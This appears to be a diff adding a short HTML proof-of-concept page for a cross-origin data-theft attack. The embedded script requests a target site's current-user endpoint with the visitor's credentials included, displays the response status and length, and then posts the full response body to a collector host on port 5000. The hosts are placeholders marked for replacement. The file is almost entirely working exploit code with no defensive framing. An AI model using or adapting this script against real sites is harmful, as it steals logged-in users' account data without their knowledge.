@@ -1,0 +1,24 @@
+<!doctype html><pre id=o></pre><script>
+const T="https://<TARGET_HOST>/v2/currentuser";     // replace
+const C="http://<COLLECTOR_HOST>:5000/collect";    // replace
+const o=document.getElementById('o');
+
+(async()=>{
+  try{
+    const r=await fetch(T,{credentials:'include'});
+    o.textContent='status:'+r.status;
+    const b=await r.text();
+    o.textContent+='\nlen:'+b.length;
+
+    await fetch(C,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({from:T,origin:location.origin,status:r.status,body:b})
+    });
+
+    o.textContent+='\nexfil sent';
+  }catch(e){
+    o.textContent='ERR:'+e;
+  }
+})();
+</script>
